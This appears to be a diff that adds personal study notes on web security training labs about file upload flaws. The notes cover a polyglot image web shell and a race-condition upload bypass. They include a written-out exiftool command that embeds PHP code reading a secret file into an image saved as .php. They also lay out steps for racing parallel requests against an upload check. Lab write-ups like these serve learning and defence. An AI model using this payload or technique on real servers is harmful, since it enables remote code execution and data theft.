@@ -153,4 +153,44 @@ This is a better way to validate files than just trusting the extension or conte
 Tools like ExifTool can modify image metadata to hide malicious code inside a valid image.
 These are called polyglot files
 
+# lab 006
+Remote code execution via polyglot web shell upload
+This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. 
+In this lab all the previous learned methods were not working so we had to create a polyglot. we used a command line tool named exiftool and we used it to embed php inside of an image. 
+# exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" phpjpgpolyglot.jpg -o polyglot.php
+command used 
+afterwards we just upload it using the post request making a small change in the description and then accesing it from the get request.
+
+
+Exploiting File Upload Race Conditions 
+What's happening behind the scenes?
+You upload a file. The server saves it immediately to disk (often in a public directory like /uploads/) with a predictable name.
+The server then:
+- Runs checks (e.g., anti-virus scan, extension filtering).
+- If checks fail → the file is deleted.
+- If checks pass → it’s accepted and possibly renamed or moved.
+Goal: Exploit the tiny window between the file being saved and being deleted.
+You can:
+- Send a file (e.g., a PHP shell).
+- In parallel, send a GET request to execute it immediately after upload but before deletion.
+
+# lab 007
+Lab: Web shell upload via race condition
+This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them. 
+
+For this lab we had to use the race window after uploading the file and before it gets deleted. we upload the file and we modify a get request to get the contents of the exploit.php and we group 4-5 such get requests and a post request and send them all together parallely. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
